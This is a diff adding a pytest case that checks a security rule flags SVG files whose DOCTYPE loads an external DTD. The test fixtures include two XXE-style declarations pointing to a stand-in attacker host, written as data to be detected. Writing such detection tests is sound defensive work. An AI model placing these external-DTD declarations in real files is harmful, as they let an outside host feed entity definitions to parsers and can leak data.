@@ -235,6 +235,24 @@ def test_svg_with_xxe_entity_declaration_is_blocked(repo):
     assert "entity" in result.findings[0].message.lower() or "DTD" in result.findings[0].message
 
 
+@pytest.mark.parametrize(
+    "doctype",
+    [
+        '<!DOCTYPE svg SYSTEM "https://attacker.example/entity.dtd">',
+        '<!DOCTYPE svg PUBLIC "-//EXAMPLE//DTD SVG 1.0//EN" "https://attacker.example/svg.dtd">',
+    ],
+)
+def test_svg_with_external_doctype_is_blocked(repo, doctype):
+    body = (
+        f"{doctype}\n"
+        '<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>\n'
+    )
+    rel = write(repo, "agents/demo/external-dtd.svg", body)
+    result = run_rule(repo, RULE, [rel])
+    assert files(result) == [rel]
+    assert "external DTD" in result.findings[0].message
+
+
 def test_svg_failure_message_reports_a_line_number(repo):
     body = (
         '<svg xmlns="http://www.w3.org/2000/svg">\n'
